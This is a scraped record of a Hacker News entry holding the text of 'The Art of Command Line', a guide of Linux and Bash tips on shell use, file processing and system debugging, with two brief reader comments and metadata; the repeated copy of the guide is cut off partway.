          " etina Deutsch English Espaol Franais Indonesia Italiano polski Portugus Romn Slovenina The Art of Command Line Note: I'm planning to revise this and looking for a new co-author to help with expanding this into a more comprehensive guide. While it's very popular, it could be broader and a bit deeper. If you like to write and are close to being an expert on this material and willing to consider helping, please drop me a note at josh (0x40) holloway.com. jlevy, Holloway. Thank you! Meta Basics Everyday use Processing files and data System debugging One-liners Obscure but useful macOS only Windows only More resources Disclaimer Fluency on the command line is a skill often neglected or considered arcane, but it improves your flexibility and productivity as an engineer in both obvious and subtle ways. This is a selection of notes and tips on using the command-line that we've found useful when working on Linux. Some tips are elementary, and some are fairly specific, sophisticated, or obscure. This page is not long, but if you can use and recall all the items here, you know a lot. This work is the result of many authors and translators. Some of this originally appeared on Quora, but it has since moved to GitHub, where people more talented than the original author have made numerous improvements. Please submit a question if you have a question related to the command line. Please contribute if you see an error or something that could be better! Meta Scope: This guide is for both beginners and experienced users. The goals are breadth (everything important), specificity (give concrete examples of the most common case), and brevity (avoid things that aren't essential or digressions you can easily look up elsewhere). Every tip is essential in some situation or significantly saves time over alternatives. This is written for Linux, with the exception of the \"macOS only\" and \"Windows only\" sections. Many of the other items apply or can be installed on other Unices or macOS (or even Cygwin). The focus is on interactive Bash, though many tips apply to other shells and to general Bash scripting. It includes both \"standard\" Unix commands as well as ones that require special package installs -- so long as they are important enough to merit inclusion. Notes: To keep this to one page, content is implicitly included by reference. You're smart enough to look up more detail elsewhere once you know the idea or command to Google. Use apt, yum, dnf, pacman, pip or brew (as appropriate) to install new programs. Use Explainshell to get a helpful breakdown of what commands, options, pipes etc. do. Basics Learn basic Bash. Actually, type man bash and at least skim the whole thing; it's pretty easy to follow and not that long. Alternate shells can be nice, but Bash is powerful and always available (learning only zsh, fish, etc., while tempting on your own laptop, restricts you in many situations, such as using existing servers). Learn at least one text-based editor well. The nano editor is one of the simplest for basic editing (opening, editing, saving, searching). However, for the power user in a text terminal, there is no substitute for Vim (vi), the hard-to-learn but venerable, fast, and full-featured editor. Many people also use the classic Emacs, particularly for larger editing tasks. (Of course, any modern software developer working on an extensive project is unlikely to use only a pure text-based editor and should also be familiar with modern graphical IDEs and tools.) Finding documentation: Know how to read official documentation with man (for the inquisitive, man man lists the section numbers, e.g. 1 is \"regular\" commands, 5 is files/conventions, and 8 are for administration). Find man pages with apropos. Know that some commands are not executables, but Bash builtins, and that you can get help on them with help and help -d. You can find out whether a command is an executable, shell builtin or an alias by using type command. curl cheat.sh/command will give a brief \"cheat sheet\" with common examples of how to use a shell command. Learn about redirection of output and input using > and < and pipes using |. Know > overwrites the output file and >> appends. Learn about stdout and stderr. Learn about file glob expansion with * (and perhaps ? and [...]) and quoting and the difference between double \" and single ' quotes. (See more on variable expansion below.) Be familiar with Bash job management: &, ctrl-z, ctrl-c, jobs, fg, bg, kill, etc. Know ssh, and the basics of passwordless authentication, via ssh-agent, ssh-add, etc. Basic file management: ls and ls -l (in particular, learn what every column in ls -l means), less, head, tail and tail -f (or even better, less +F), ln and ln -s (learn the differences and advantages of hard versus soft links), chown, chmod, du (for a quick summary of disk usage: du -hs *). For filesystem management, df, mount, fdisk, mkfs, lsblk. Learn what an inode is (ls -i or df -i). Basic network management: ip or ifconfig, dig, traceroute, route. Learn and use a version control management system, such as git. Know regular expressions well, and the various flags to grep/egrep. The -i, -o, -v, -A, -B, and -C options are worth knowing. Learn to use apt-get, yum, dnf or pacman (depending on distro) to find and install packages. And make sure you have pip to install Python-based command-line tools (a few below are easiest to install via pip). Everyday use In Bash, use Tab to complete arguments or list all available commands and ctrl-r to search through command history (after pressing, type to search, press ctrl-r repeatedly to cycle through more matches, press Enter to execute the found command, or hit the right arrow to put the result in the current line to allow editing). In Bash, use ctrl-w to delete the last word, and ctrl-u to delete the content from current cursor back to the start of the line. Use alt-b and alt-f to move by word, ctrl-a to move cursor to beginning of line, ctrl-e to move cursor to end of line, ctrl-k to kill to the end of the line, ctrl-l to clear the screen. See man readline for all the default keybindings in Bash. There are a lot. For example alt-. cycles through previous arguments, and alt-* expands a glob. Alternatively, if you love vi-style key-bindings, use set -o vi (and set -o emacs to put it back). For editing long commands, after setting your editor (for example export EDITOR=vim), ctrl-x ctrl-e will open the current command in an editor for multi-line editing. Or in vi style, escape-v. To see recent commands, use history. Follow with !n (where n is the command number) to execute again. There are also many abbreviations you can use, the most useful probably being !$ for last argument and !! for last command (see \"HISTORY EXPANSION\" in the man page). However, these are often easily replaced with ctrl-r and alt-.. Go to your home directory with cd. Access files relative to your home directory with the ~ prefix (e.g. ~/.bashrc). In sh scripts refer to the home directory as $HOME. To go back to the previous working directory: cd -. If you are halfway through typing a command but change your mind, hit alt-# to add a # at the beginning and enter it as a comment (or use ctrl-a, #, enter). You can then return to it later via command history. Use xargs (or parallel). It's very powerful. Note you can control how many items execute per line (-L) as well as parallelism (-P). If you're not sure if it'll do the right thing, use xargs echo first. Also, -I{} is handy. Examples: find . -name '*.py' | xargs grep some_function cat hosts | xargs -I{} ssh root@{} hostname pstree -p is a helpful display of the process tree. Use pgrep and pkill to find or signal processes by name (-f is helpful). Know the various signals you can send processes. For example, to suspend a process, use kill -STOP [pid]. For the full list, see man 7 signal Use nohup or disown if you want a background process to keep running forever. Check what processes are listening via netstat -lntp or ss -plat (for TCP; add -u for UDP) or lsof -iTCP -sTCP:LISTEN -P -n (which also works on macOS). See also lsof and fuser for open sockets and files. See uptime or w to know how long the system has been running. Use alias to create shortcuts for commonly used commands. For example, alias ll='ls -latr' creates a new alias ll. Save aliases, shell settings, and functions you commonly use in ~/.bashrc, and arrange for login shells to source it. This will make your setup available in all your shell sessions. Put the settings of environment variables as well as commands that should be executed when you login in ~/.bash_profile. Separate configuration will be needed for shells you launch from graphical environment logins and cron jobs. Synchronize your configuration files (e.g. .bashrc and .bash_profile) among various computers with Git. Understand that care is needed when variables and filenames include whitespace. Surround your Bash variables with quotes, e.g. \"$FOO\". Prefer the -0 or -print0 options to enable null characters to delimit filenames, e.g. locate -0 pattern | xargs -0 ls -al or find / -print0 -type d | xargs -0 ls -al. To iterate on filenames containing whitespace in a for loop, set your IFS to be a newline only using IFS=$'\\n'. In Bash scripts, use set -x (or the variant set -v, which logs raw input, including unexpanded variables and comments) for debugging output. Use strict modes unless you have a good reason not to: Use set -e to abort on errors (nonzero exit code). Use set -u to detect unset variable usages. Consider set -o pipefail too, to abort on errors within pipes (though read up on it more if you do, as this topic is a bit subtle). For more involved scripts, also use trap on EXIT or ERR. A useful habit is to start a script like this, which will make it detect and abort on common errors and print a message: set -euo pipefail trap \"echo 'error: Script failed: see failed command above'\" ERR In Bash scripts, subshells (written with parentheses) are convenient ways to group commands. A common example is to temporarily move to a different working directory, e.g. # do something in current dir (cd /some/other/dir && other-command) # continue in original dir In Bash, note there are lots of kinds of variable expansion. Checking a variable exists: ${name:?error message}. For example, if a Bash script requires a single argument, just write input_file=${1:?usage: $0 input_file}. Using a default value if a variable is empty: ${name:-default}. If you want to have an additional (optional) parameter added to the previous example, you can use something like output_file=${2:-logfile}. If $2 is omitted and thus empty, output_file will be set to logfile. Arithmetic expansion: i=$(( (i + 1) % 5 )). Sequences: {1..10}. Trimming of strings: ${var%suffix} and ${var#prefix}. For example if var=foo.pdf, then echo ${var%.pdf}.txt prints foo.txt. Brace expansion using {...} can reduce having to re-type similar text and automate combinations of items. This is helpful in examples like mv foo.{txt,pdf} some-dir (which moves both files), cp somefile{,.bak} (which expands to cp somefile somefile.bak) or mkdir -p test-{a,b,c}/subtest-{1,2,3} (which expands all possible combinations and creates a directory tree). Brace expansion is performed before any other expansion. The order of expansions is: brace expansion; tilde expansion, parameter and variable expansion, arithmetic expansion, and command substitution (done in a left-to-right fashion); word splitting; and filename expansion. (For example, a range like {1..20} cannot be expressed with variables using {$a..$b}. Use seq or a for loop instead, e.g., seq $a $b or for((i=a; i<=b; i++)); do ... ; done.) The output of a command can be treated like a file via <(some command) (known as process substitution). For example, compare local /etc/hosts with a remote one: diff /etc/hosts <(ssh somehost cat /etc/hosts) When writing scripts you may want to put all of your code in curly braces. If the closing brace is missing, your script will be prevented from executing due to a syntax error. This makes sense when your script is going to be downloaded from the web, since it prevents partially downloaded scripts from executing: A \"here document\" allows redirection of multiple lines of input as if from a file: cat <<EOF input on multiple lines EOF In Bash, redirect both standard output and standard error via: some-command >logfile 2>&1 or some-command &>logfile. Often, to ensure a command does not leave an open file handle to standard input, tying it to the terminal you are in, it is also good practice to add </dev/null. Use man ascii for a good ASCII table, with hex and decimal values. For general encoding info, man unicode, man utf-8, and man latin1 are helpful. Use screen or tmux to multiplex the screen, especially useful on remote ssh sessions and to detach and re-attach to a session. byobu can enhance screen or tmux by providing more information and easier management. A more minimal alternative for session persistence only is dtach. In ssh, knowing how to port tunnel with -L or -D (and occasionally -R) is useful, e.g. to access web sites from a remote server. It can be useful to make a few optimizations to your ssh configuration; for example, this ~/.ssh/config contains settings to avoid dropped connections in certain network environments, uses compression (which is helpful with scp over low-bandwidth connections), and multiplex channels to the same server with a local control file: TCPKeepAlive=yes ServerAliveInterval=15 ServerAliveCountMax=6 Compression=yes ControlMaster auto ControlPath /tmp/%r@%h:%p ControlPersist yes A few other options relevant to ssh are security sensitive and should be enabled with care, e.g. per subnet or host or in trusted networks: StrictHostKeyChecking=no, ForwardAgent=yes Consider mosh an alternative to ssh that uses UDP, avoiding dropped connections and adding convenience on the road (requires server-side setup). To get the permissions on a file in octal form, which is useful for system configuration but not available in ls and easy to bungle, use something like stat -c '%A %a %n' /etc/timezone For interactive selection of values from the output of another command, use percol or fzf. For interaction with files based on the output of another command (like git), use fpp (PathPicker). For a simple web server for all files in the current directory (and subdirs), available to anyone on your network, use: python -m SimpleHTTPServer 7777 (for port 7777 and Python 2) and python -m http.server 7777 (for port 7777 and Python 3). For running a command as another user, use sudo. Defaults to running as root; use -u to specify another user. Use -i to login as that user (you will be asked for your password). For switching the shell to another user, use su username or su - username. The latter with \"-\" gets an environment as if another user just logged in. Omitting the username defaults to root. You will be asked for the password of the user you are switching to. Know about the 128K limit on command lines. This \"Argument list too long\" error is common when wildcard matching large numbers of files. (When this happens alternatives like find and xargs may help.) For a basic calculator (and of course access to Python in general), use the python interpreter. For example, Processing files and data To locate a file by name in the current directory, find . -iname '*something*' (or similar). To find a file anywhere by name, use locate something (but bear in mind updatedb may not have indexed recently created files). For general searching through source or data files, there are several options more advanced or faster than grep -r, including (in rough order from older to newer) ack, ag (\"the silver searcher\"), and rg (ripgrep). To convert HTML to text: lynx -dump -stdin For Markdown, HTML, and all kinds of document conversion, try pandoc. For example, to convert a Markdown document to Word format: pandoc README.md --from markdown --to docx -o temp.docx If you must handle XML, xmlstarlet is old but good. For JSON, use jq. For interactive use, also see jid and jiq. For YAML, use shyaml. For Excel or CSV files, csvkit provides in2csv, csvcut, csvjoin, csvgrep, etc. For Amazon S3, s3cmd is convenient and s4cmd is faster. Amazon's aws and the improved saws are essential for other AWS-related tasks. Know about sort and uniq, including uniq's -u and -d options -- see one-liners below. See also comm. Know about cut, paste, and join to manipulate text files. Many people use cut but forget about join. Know about wc to count newlines (-l), characters (-m), words (-w) and bytes (-c). Know about tee to copy from stdin to a file and also to stdout, as in ls -al | tee file.txt. For more complex calculations, including grouping, reversing fields, and statistical calculations, consider datamash. Know that locale affects a lot of command line tools in subtle ways, including sorting order (collation) and performance. Most Linux installations will set LANG or other locale variables to a local setting like US English. But be aware sorting will change if you change locale. And know i18n routines can make sort or other commands run many times slower. In some situations (such as the set operations or uniqueness operations below) you can safely ignore slow i18n routines entirely and use traditional byte-based sort order, using export LC_ALL=C. You can set a specific command's environment by prefixing its invocation with the environment variable settings, as in TZ=Pacific/Fiji date. Know basic awk and sed for simple data munging. See One-liners for examples. To replace all occurrences of a string in place, in one or more files: perl -pi.bak -e 's/old-string/new-string/g' my-files-*.txt To rename multiple files and/or search and replace within files, try repren. (In some cases the rename command also allows multiple renames, but be careful as its functionality is not the same on all Linux distributions.) # Full rename of filenames, directories, and contents foo -> bar: repren --full --preserve-case --from foo --to bar . # Recover backup files whatever.bak -> whatever: repren --renames --from '(.*)\\.bak' --to '\\1' *.bak # Same as above, using rename, if available: rename 's/\\.bak$//' *.bak As the man page says, rsync really is a fast and extraordinarily versatile file copying tool. It's known for synchronizing between machines but is equally useful locally. When security restrictions allow, using rsync instead of scp allows recovery of a transfer without restarting from scratch. It also is among the fastest ways to delete large numbers of files: mkdir empty && rsync -r --delete empty/ some-dir && rmdir some-dir For monitoring progress when processing files, use pv, pycp, pmonitor, progress, rsync --progress, or, for block-level copying, dd status=progress. Use shuf to shuffle or select random lines from a file. Know sort's options. For numbers, use -n, or -h for handling human-readable numbers (e.g. from du -h). Know how keys work (-t and -k). In particular, watch out that you need to write -k1,1 to sort by only the first field; -k1 means sort according to the whole line. Stable sort (sort -s) can be useful. For example, to sort first by field 2, then secondarily by field 1, you can use sort -k1,1 | sort -s -k2,2. If you ever need to write a tab literal in a command line in Bash (e.g. for the -t argument to sort), press ctrl-v [Tab] or write $'\\t' (the latter is better as you can copy/paste it). The standard tools for patching source code are diff and patch. See also diffstat for summary statistics of a diff and sdiff for a side-by-side diff. Note diff -r works for entire directories. Use diff -r tree1 tree2 | diffstat for a summary of changes. Use vimdiff to compare and edit files. For binary files, use hd, hexdump or xxd for simple hex dumps and bvi, hexedit or biew for binary editing. Also for binary files, strings (plus grep, etc.) lets you find bits of text. For binary diffs (delta compression), use xdelta3. To convert text encodings, try iconv. Or uconv for more advanced use; it supports some advanced Unicode things. For example: # Displays hex codes or actual names of characters (useful for debugging): uconv -f utf-8 -t utf-8 -x '::Any-Hex;' < input.txt uconv -f utf-8 -t utf-8 -x '::Any-Name;' < input.txt # Lowercase and removes all accents (by expanding and dropping them): uconv -f utf-8 -t utf-8 -x '::Any-Lower; ::Any-NFD; [:Nonspacing Mark:] >; ::Any-NFC;' < input.txt > output.txt To split files into pieces, see split (to split by size) and csplit (to split by a pattern). Date and time: To get the current date and time in the helpful ISO 8601 format, use date -u +\"%Y-%m-%dT%H:%M:%SZ\" (other options are problematic). To manipulate date and time expressions, use dateadd, datediff, strptime etc. from dateutils. Use zless, zmore, zcat, and zgrep to operate on compressed files. File attributes are settable via chattr and offer a lower-level alternative to file permissions. For example, to protect against accidental file deletion the immutable flag: sudo chattr +i /critical/directory/or/file Use getfacl and setfacl to save and restore file permissions. For example: getfacl -R /some/path > permissions.txt setfacl --restore=permissions.txt To create empty files quickly, use truncate (creates sparse file), fallocate (ext4, xfs, btrfs and ocfs2 filesystems), xfs_mkfile (almost any filesystems, comes in xfsprogs package), mkfile (for Unix-like systems like Solaris, Mac OS). System debugging For web debugging, curl and curl -I are handy, or their wget equivalents, or the more modern httpie. To know current cpu/disk status, the classic tools are top (or the better htop), iostat, and iotop. Use iostat -mxz 15 for basic CPU and detailed per-partition disk stats and performance insight. For network connection details, use netstat and ss. For a quick overview of what's happening on a system, dstat is especially useful. For broadest overview with details, use glances. To know memory status, run and understand the output of free and vmstat. In particular, be aware the \"cached\" value is memory held by the Linux kernel as file cache, so effectively counts toward the \"free\" value. Java system debugging is a different kettle of fish, but a simple trick on Oracle's and some other JVMs is that you can run kill -3 <pid> and a full stack trace and heap summary (including generational garbage collection details, which can be highly informative) will be dumped to stderr/logs. The JDK's jps, jstat, jstack, jmap are useful. SJK tools are more advanced. Use mtr as a better traceroute, to identify network issues. For looking at why a disk is full, ncdu saves time over the usual commands like du -sh *. To find which socket or process is using bandwidth, try iftop or nethogs. The ab tool (comes with Apache) is helpful for quick-and-dirty checking of web server performance. For more complex load testing, try siege. For more serious network debugging, wireshark, tshark, or ngrep. Know about strace and ltrace. These can be helpful if a program is failing, hanging, or crashing, and you don't know why, or if you want to get a general idea of performance. Note the profiling option (-c), and the ability to attach to a running process (-p). Use trace child option (-f) to avoid missing important calls. Know about ldd to check shared libraries etc but never run it on untrusted files. Know how to connect to a running process with gdb and get its stack traces. Use /proc. It's amazingly helpful sometimes when debugging live problems. Examples: /proc/cpuinfo, /proc/meminfo, /proc/cmdline, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps (where xxx is the process id or pid). When debugging why something went wrong in the past, sar can be very helpful. It shows historic statistics on CPU, memory, network, etc. For deeper systems and performance analyses, look at stap (SystemTap), perf, and sysdig. Check what OS you're on with uname or uname -a (general Unix/kernel info) or lsb_release -a (Linux distro info). Use dmesg whenever something's acting really funny (it could be hardware or driver issues). If you delete a file and it doesn't free up expected disk space as reported by du, check whether the file is in use by a process: lsof | grep deleted | grep \"filename-of-my-big-file\" One-liners A few examples of piecing together commands: It is remarkably helpful sometimes that you can do set intersection, union, and difference of text files via sort/uniq. Suppose a and b are text files that are already uniqued. This is fast, and works on files of arbitrary size, up to many gigabytes. (Sort is not limited by memory, though you may need to use the -T option if /tmp is on a small root partition.) See also the note about LC_ALL above and sort's -u option (left out for clarity below). sort a b | uniq > c # c is a union b sort a b | uniq -d > c # c is a intersect b sort a b b | uniq -u > c # c is set difference a - b Pretty-print two JSON files, normalizing their syntax, then coloring and paginating the result: diff <(jq --sort-keys . < file1.json) <(jq --sort-keys . < file2.json) | colordiff | less -R Use grep . * to quickly examine the contents of all files in a directory (so each line is paired with the filename), or head -100 * (so each file has a heading). This can be useful for directories filled with config settings like those in /sys, /proc, /etc. Summing all numbers in the third column of a text file (this is probably 3X faster and 3X less code than equivalent Python): awk '{ x += $3 } END { print x }' myfile To see sizes/dates on a tree of files, this is like a recursive ls -l but is easier to read than ls -lR: Say you have a text file, like a web server log, and a certain value that appears on some lines, such as an acct_id parameter that is present in the URL. If you want a tally of how many requests for each acct_id: egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn To continuously monitor changes, use watch, e.g. check changes to files in a directory with watch -d -n 2 'ls -rtlh | tail' or to network settings while troubleshooting your wifi settings with watch -d -n 2 ifconfig. Run this function to get a random tip from this document (parses Markdown and extracts an item): function taocl() { curl -s https://raw.githubusercontent.com/jlevy/the-art-of-command-line/master/README.md | sed '/cowsay[.]png/d' | pandoc -f markdown -t html | xmlstarlet fo --html --dropdtd | xmlstarlet sel -t -v \"(html/body/ul/li[count(p)>0])[$RANDOM mod last()+1]\" | xmlstarlet unesc | fmt -80 | iconv -t US } Obscure but useful expr: perform arithmetic or boolean operations or evaluate regular expressions m4: simple macro processor yes: print a string a lot cal: nice calendar env: run a command (useful in scripts) printenv: print out environment variables (useful in debugging and scripts) look: find English words (or lines in a file) beginning with a string cut, paste and join: data manipulation fmt: format text paragraphs pr: format text into pages/columns fold: wrap lines of text column: format text fields into aligned, fixed-width columns or tables expand and unexpand: convert between tabs and spaces nl: add line numbers seq: print numbers bc: calculator factor: factor integers gpg: encrypt and sign files toe: table of terminfo entries nc: network debugging and data transfer socat: socket relay and tcp port forwarder (similar to netcat) slurm: network traffic visualization dd: moving data between files or devices file: identify type of a file tree: display directories and subdirectories as a nesting tree; like ls but recursive stat: file info time: execute and time a command timeout: execute a command for specified amount of time and stop the process when the specified amount of time completes. lockfile: create semaphore file that can only be removed by rm -f logrotate: rotate, compress and mail logs. watch: run a command repeatedly, showing results and/or highlighting changes when-changed: runs any command you specify whenever it sees file changed. See inotifywait and entr as well. tac: print files in reverse comm: compare sorted files line by line strings: extract text from binary files tr: character translation or manipulation iconv or uconv: conversion for text encodings split and csplit: splitting files sponge: read all input before writing it, useful for reading from then writing to the same file, e.g., grep -v something some-file | sponge some-file units: unit conversions and calculations; converts furlongs per fortnight to twips per blink (see also /usr/share/units/definitions.units) apg: generates random passwords xz: high-ratio file compression ldd: dynamic library info nm: symbols from object files ab or wrk: benchmarking web servers strace: system call debugging mtr: better traceroute for network debugging cssh: visual concurrent shell rsync: sync files and folders over SSH or in local file system wireshark and tshark: packet capture and network debugging ngrep: grep for the network layer host and dig: DNS lookups lsof: process file descriptor and socket info dstat: useful system stats glances: high level, multi-subsystem overview iostat: Disk usage stats mpstat: CPU usage stats vmstat: Memory usage stats htop: improved version of top last: login history w: who's logged on id: user/group identity info sar: historic system stats iftop or nethogs: network utilization by socket or process ss: socket statistics dmesg: boot and system error messages sysctl: view and configure Linux kernel parameters at run time hdparm: SATA/ATA disk manipulation/performance lsblk: list block devices: a tree view of your disks and disk partitions lshw, lscpu, lspci, lsusb, dmidecode: hardware information, including CPU, BIOS, RAID, graphics, devices, etc. lsmod and modinfo: List and show details of kernel modules. fortune, ddate, and sl: um, well, it depends on whether you consider steam locomotives and Zippy quotations \"useful\" macOS only These are items relevant only on macOS. Package management with brew (Homebrew) and/or port (MacPorts). These can be used to install on macOS many of the above commands. Copy output of any command to a desktop app with pbcopy and paste input from one with pbpaste. To enable the Option key in macOS Terminal as an alt key (such as used in the commands above like alt-b, alt-f, etc.), open Preferences -> Profiles -> Keyboard and select \"Use Option as Meta key\". To open a file with a desktop app, use open or open -a /Applications/Whatever.app. Spotlight: Search files with mdfind and list metadata (such as photo EXIF info) with mdls. Be aware macOS is based on BSD Unix, and many commands (for example ps, ls, tail, awk, sed) have many subtle variations from Linux, which is largely influenced by System V-style Unix and GNU tools. You can often tell the difference by noting a man page has the heading \"BSD General Commands Manual.\" In some cases GNU versions can be installed, too (such as gawk and gsed for GNU awk and sed). If writing cross-platform Bash scripts, avoid such commands (for example, consider Python or perl) or test carefully. To get macOS release information, use sw_vers. Windows only These items are relevant only on Windows. Ways to obtain Unix tools under Windows Access the power of the Unix shell under Microsoft Windows by installing Cygwin. Most of the things described in this document will work out of the box. On Windows 10, you can use Windows Subsystem for Linux (WSL), which provides a familiar Bash environment with Unix command line utilities. If you mainly want to use GNU developer tools (such as GCC) on Windows, consider MinGW and its MSYS package, which provides utilities such as bash, gawk, make and grep. MSYS doesn't have all the features compared to Cygwin. MinGW is particularly useful for creating native Windows ports of Unix tools. Another option to get Unix look and feel under Windows is Cash. Note that only very few Unix commands and command-line options are available in this environment. Useful Windows command-line tools You can perform and script most Windows system administration tasks from the command line by learning and using wmic. Native command-line Windows networking tools you may find useful include ping, ipconfig, tracert, and netstat. You can perform many useful Windows tasks by invoking the Rundll32 command. Cygwin tips and tricks Install additional Unix programs with the Cygwin's package manager. Use mintty as your command-line window. Access the Windows clipboard through /dev/clipboard. Run cygstart to open an arbitrary file through its registered application. Access the Windows registry with regtool. Note that a C:\\ Windows drive path becomes /cygdrive/c under Cygwin, and that Cygwin's / appears under C:\\cygwin on Windows. Convert between Cygwin and Windows-style file paths with cygpath. This is most useful in scripts that invoke Windows programs. More resources awesome-shell: A curated list of shell tools and resources. awesome-osx-command-line: A more in-depth guide for the macOS command line. Strict mode for writing better shell scripts. shellcheck: A shell script static analysis tool. Essentially, lint for bash/sh/zsh. Filenames and Pathnames in Shell: The sadly complex minutiae on how to handle filenames correctly in shell scripts. Data Science at the Command Line: More commands and tools helpful for doing data science, from the book of the same name Disclaimer With the exception of very small tasks, code is written so others can read it. With power comes responsibility. The fact you can do something in Bash doesn't necessarily mean you should! ;) License This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License. ",
          "> Learn basic Bash. Actually, type man bash and at least skim the whole thing; it's pretty easy to follow and not that long<p>Skimming <i>The Grapes of Wrath</i> would be shorter. Thank you, but no thank you.",
          "<i>Many people also use the classic Emacs, particularly for larger editing tasks. (Of course, any modern software developer working on an extensive project is unlikely to use only a pure text-based editor and should also be familiar with modern graphical IDEs and tools.)</i><p>Huh?! Unlikely?!"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/jlevy/the-art-of-command-line",
        "comments.comment_id": [19989314, 19989338],
        "comments.comment_author": ["smith-kyle", "molteanu"],
        "comments.comment_descendants": [8, 4],
        "comments.comment_time": [
          "2019-05-23T07:16:13Z",
          "2019-05-23T07:21:38Z"
        ],
        "comments.comment_text": [
          "> Learn basic Bash. Actually, type man bash and at least skim the whole thing; it's pretty easy to follow and not that long<p>Skimming <i>The Grapes of Wrath</i> would be shorter. Thank you, but no thank you.",
          "<i>Many people also use the classic Emacs, particularly for larger editing tasks. (Of course, any modern software developer working on an extensive project is unlikely to use only a pure text-based editor and should also be familiar with modern graphical IDEs and tools.)</i><p>Huh?! Unlikely?!"
        ],
        "id": "f0ba328f-b1f2-4a69-b915-5f9420914470",
        "url_text": " etina Deutsch English Espaol Franais Indonesia Italiano polski Portugus Romn Slovenina The Art of Command Line Note: I'm planning to revise this and looking for a new co-author to help with expanding this into a more comprehensive guide. While it's very popular, it could be broader and a bit deeper. If you like to write and are close to being an expert on this material and willing to consider helping, please drop me a note at josh (0x40) holloway.com. jlevy, Holloway. Thank you! Meta Basics Everyday use Processing files and data System debugging One-liners Obscure but useful macOS only Windows only More resources Disclaimer Fluency on the command line is a skill often neglected or considered arcane, but it improves your flexibility and productivity as an engineer in both obvious and subtle ways. This is a selection of notes and tips on using the command-line that we've found useful when working on Linux. Some tips are elementary, and some are fairly specific, sophisticated, or obscure. This page is not long, but if you can use and recall all the items here, you know a lot. This work is the result of many authors and translators. Some of this originally appeared on Quora, but it has since moved to GitHub, where people more talented than the original author have made numerous improvements. Please submit a question if you have a question related to the command line. Please contribute if you see an error or something that could be better! Meta Scope: This guide is for both beginners and experienced users. The goals are breadth (everything important), specificity (give concrete examples of the most common case), and brevity (avoid things that aren't essential or digressions you can easily look up elsewhere). Every tip is essential in some situation or significantly saves time over alternatives. This is written for Linux, with the exception of the \"macOS only\" and \"Windows only\" sections. Many of the other items apply or can be installed on other Unices or macOS (or even Cygwin). The focus is on interactive Bash, though many tips apply to other shells and to general Bash scripting. It includes both \"standard\" Unix commands as well as ones that require special package installs -- so long as they are important enough to merit inclusion. Notes: To keep this to one page, content is implicitly included by reference. You're smart enough to look up more detail elsewhere once you know the idea or command to Google. Use apt, yum, dnf, pacman, pip or brew (as appropriate) to install new programs. Use Explainshell to get a helpful breakdown of what commands, options, pipes etc. do. Basics Learn basic Bash. Actually, type man bash and at least skim the whole thing; it's pretty easy to follow and not that long. Alternate shells can be nice, but Bash is powerful and always available (learning only zsh, fish, etc., while tempting on your own laptop, restricts you in many situations, such as using existing servers). Learn at least one text-based editor well. The nano editor is one of the simplest for basic editing (opening, editing, saving, searching). However, for the power user in a text terminal, there is no substitute for Vim (vi), the hard-to-learn but venerable, fast, and full-featured editor. Many people also use the classic Emacs, particularly for larger editing tasks. (Of course, any modern software developer working on an extensive project is unlikely to use only a pure text-based editor and should also be familiar with modern graphical IDEs and tools.) Finding documentation: Know how to read official documentation with man (for the inquisitive, man man lists the section numbers, e.g. 1 is \"regular\" commands, 5 is files/conventions, and 8 are for administration). Find man pages with apropos. Know that some commands are not executables, but Bash builtins, and that you can get help on them with help and help -d. You can find out whether a command is an executable, shell builtin or an alias by using type command. curl cheat.sh/command will give a brief \"cheat sheet\" with common examples of how to use a shell command. Learn about redirection of output and input using > and < and pipes using |. Know > overwrites the output file and >> appends. Learn about stdout and stderr. Learn about file glob expansion with * (and perhaps ? and [...]) and quoting and the difference between double \" and single ' quotes. (See more on variable expansion below.) Be familiar with Bash job management: &, ctrl-z, ctrl-c, jobs, fg, bg, kill, etc. Know ssh, and the basics of passwordless authentication, via ssh-agent, ssh-add, etc. Basic file management: ls and ls -l (in particular, learn what every column in ls -l means), less, head, tail and tail -f (or even better, less +F), ln and ln -s (learn the differences and advantages of hard versus soft links), chown, chmod, du (for a quick summary of disk usage: du -hs *). For filesystem management, df, mount, fdisk, mkfs, lsblk. Learn what an inode is (ls -i or df -i). Basic network management: ip or ifconfig, dig, traceroute, route. Learn and use a version control management system, such as git. Know regular expressions well, and the various flags to grep/egrep. The -i, -o, -v, -A, -B, and -C options are worth knowing. Learn to use apt-get, yum, dnf or pacman (depending on distro) to find and install packages. And make sure you have pip to install Python-based command-line tools (a few below are easiest to install via pip). Everyday use In Bash, use Tab to complete arguments or list all available commands and ctrl-r to search through command history (after pressing, type to search, press ctrl-r repeatedly to cycle through more matches, press Enter to execute the found command, or hit the right arrow to put the result in the current line to allow editing). In Bash, use ctrl-w to delete the last word, and ctrl-u to delete the content from current cursor back to the start of the line. Use alt-b and alt-f to move by word, ctrl-a to move cursor to beginning of line, ctrl-e to move cursor to end of line, ctrl-k to kill to the end of the line, ctrl-l to clear the screen. See man readline for all the default keybindings in Bash. There are a lot. For example alt-. cycles through previous arguments, and alt-* expands a glob. Alternatively, if you love vi-style key-bindings, use set -o vi (and set -o emacs to put it back). For editing long commands, after setting your editor (for example export EDITOR=vim), ctrl-x ctrl-e will open the current command in an editor for multi-line editing. Or in vi style, escape-v. To see recent commands, use history. Follow with !n (where n is the command number) to execute again. There are also many abbreviations you can use, the most useful probably being !$ for last argument and !! for last command (see \"HISTORY EXPANSION\" in the man page). However, these are often easily replaced with ctrl-r and alt-.. Go to your home directory with cd. Access files relative to your home directory with the ~ prefix (e.g. ~/.bashrc). In sh scripts refer to the home directory as $HOME. To go back to the previous working directory: cd -. If you are halfway through typing a command but change your mind, hit alt-# to add a # at the beginning and enter it as a comment (or use ctrl-a, #, enter). You can then return to it later via command history. Use xargs (or parallel). It's very powerful. Note you can control how many items execute per line (-L) as well as parallelism (-P). If you're not sure if it'll do the right thing, use xargs echo first. Also, -I{} is handy. Examples: find . -name '*.py' | xargs grep some_function cat hosts | xargs -I{} ssh root@{} hostname pstree -p is a helpful display of the process tree. Use pgrep and pkill to find or signal processes by name (-f is helpful). Know the various signals you can send processes. For example, to suspend a process, use kill -STOP [pid]. For the full list, see man 7 signal Use nohup or disown if you want a background process to keep running forever. Check what processes are listening via netstat -lntp or ss -plat (for TCP; add -u for UDP) or lsof -iTCP -sTCP:LISTEN -P -n (which also works on macOS). See also lsof and fuser for open sockets and files. See uptime or w to know how long the system has been running. Use alias to create shortcuts for commonly used commands. For example, alias ll='ls -latr' creates a new alias ll. Save 